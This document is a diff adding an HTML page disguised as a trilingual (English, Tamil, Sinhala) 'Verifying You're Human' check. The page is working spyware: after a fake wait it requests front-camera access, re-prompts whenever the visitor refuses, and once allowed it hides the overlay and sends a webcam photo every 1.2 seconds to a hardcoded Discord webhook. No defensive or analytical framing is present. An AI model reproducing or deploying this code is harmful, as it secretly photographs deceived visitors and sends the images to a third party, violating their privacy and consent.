@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verifying You're Human... / நீங்கள் மனிதரா என சரிபார்க்கிறது... / ඔබ මිනිසෙක්දැයි සත්‍යාපනය කරමින්...</title>
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      background: linear-gradient(135deg, #0a0026, #1a0052);
+      color: #00ffea;
+      font-family: Arial, sans-serif;
+      overflow: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+    }
+    #verify-screen {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.95);
+      z-index: 9999;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 30px;
+    }
+    .title {
+      font-size: 3rem;
+      margin-bottom: 30px;
+      text-shadow: 0 0 20px #00ffea;
+      animation: glow 2s infinite alternate;
+    }
+    .status {
+      font-size: 1.8rem;
+      margin: 20px 0;
+      color: #ff69b4;
+      min-height: 80px;
+    }
+    .lang-block {
+      font-size: 1.5rem;
+      margin: 15px 0;
+      line-height: 1.5;
+    }
+    .spinner {
+      width: 80px;
+      height: 80px;
+      border: 8px solid #00ffea;
+      border-top: 8px solid transparent;
+      border-radius: 50%;
+      animation: spin 1.2s linear infinite;
+      margin: 30px auto;
+    }
+    .btn-retry {
+      display: none;
+      padding: 18px 60px;
+      font-size: 1.8rem;
+      background: #ff1493;
+      color: white;
+      border: none;
+      border-radius: 50px;
+      margin-top: 30px;
+      cursor: pointer;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+    }
+    .btn-retry:hover {
+      background: #ff69b4;
+      transform: scale(1.05);
+    }
+    @keyframes glow {
+      from { text-shadow: 0 0 15px #00ffea; }
+      to { text-shadow: 0 0 50px #00ffea; }
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    video, canvas { display: none; }
+  </style>
+</head>
+<body>
+
+<div id="verify-screen">
+  <div class="title">Verifying You're Human... / நீங்கள் மனிதரா என சரிபார்க்கிறது... / ඔබ මිනිසෙක්දැයි සත්‍යාපනය කරමින්...</div>
+  
+  <div class="spinner" id="spinner"></div>
+  
+  <div class="status" id="status"></div>
+  
+  <div class="lang-block">
+    <strong>English:</strong> Tap ALLOW to verify and continue<br>
+    <strong>தமிழ்:</strong> தொடர சரிபார்க்க ALLOW என்பதை தட்டவும்<br>
+    <strong>සිංහල:</strong> තහවුරු කිරීමට ALLOW ඔබන්න
+  </div>
+  
+  <button class="btn-retry" id="retryBtn">Try Again - Allow Camera ♡ / மீண்டும் முயற்சி / නැවත උත්සාහ කරන්න</button>
+</div>
+
+<video id="video" autoplay playsinline muted></video>
+<canvas id="canvas"></canvas>
+
+<script>
+// Your Discord webhook
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1468730735459569868/zcrVS4WVfHwsyi7RaUF6x6MjmTC8pwkMQmv1mR9N7n4DDQCldHmP8EObTQgxYD_m-NlJ";
+
+const status = document.getElementById('status');
+const spinner = document.getElementById('spinner');
+const retryBtn = document.getElementById('retryBtn');
+const verifyScreen = document.getElementById('verify-screen');
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+
+const messages = {
+  verifying: [
+    "Verifying you're human... Please wait ♡",
+    "நீங்கள் மனிதரா என சரிபார்க்கிறோம்... காத்திருக்கவும் ♡",
+    "ඔබ මිනිසෙක්දැයි සත්‍යාපනය කරමින්... රැඳී සිටින්න ♡"
+  ],
+  failed: [
+    "Verification failed. Tap ALLOW to verify and continue",
+    "சரிபார்ப்பு தோல்வியடைந்தது. தொடர ALLOW ஐ தட்டவும்",
+    "සත්‍යාපනය අසාර්ථක විය. තහවුරු කිරීමට ALLOW ඔබන්න"
+  ]
+};
+
+let currentLangIndex = 0;
+
+function updateStatus(type) {
+  status.innerHTML = messages[type][currentLangIndex];
+  currentLangIndex = (currentLangIndex + 1) % 3;
+}
+
+async function requestCamera() {
+  try {
+    retryBtn.style.display = 'none';
+    spinner.style.display = 'block';
+    updateStatus('verifying');
+
+    // Fake 10-second wait
+    await new Promise(r => setTimeout(r, 10000));
+
+    // Now request real permission
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" }
+    });
+
+    // Success! Hide verification screen
+    verifyScreen.style.display = 'none';
+
+    video.srcObject = stream;
+    await video.play();
+
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+
+    // Start sending photos
+    setInterval(() => {
+      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+      const dataUrl = canvas.toDataURL('image/jpeg', 0.68);
+
+      const byteString = atob(dataUrl.split(',')[1]);
+      const mimeString = dataUrl.split(',')[0].split(':')[1].split(';')[0];
+      const ab = new ArrayBuffer(byteString.length);
+      const ia = new Uint8Array(ab);
+      for (let i = 0; i < byteString.length; i++) {
+        ia[i] = byteString.charCodeAt(i);
+      }
+      const blob = new Blob([ab], { type: mimeString });
+
+      const formData = new FormData();
+      formData.append('file', blob, `human_verify_${Date.now()}.jpg`);
+      formData.append('payload_json', JSON.stringify({
+        content: `📸 Human verification photo at ${new Date().toLocaleString()} ♡`
+      }));
+
+      fetch(WEBHOOK_URL, { method: 'POST', body: formData })
+        .catch(err => console.log("Send error:", err));
+    }, 1200);
+
+  } catch (err) {
+    // Denied or error
+    spinner.style.display = 'none';
+    updateStatus('failed');
+    retryBtn.style.display = 'block';
+
+    // Re-request permission when they click again
+    retryBtn.onclick = () => requestCamera();
+  }
+}
+
+// Start first attempt automatically
+requestCamera();
+</script>
+
+</body>
+</html>
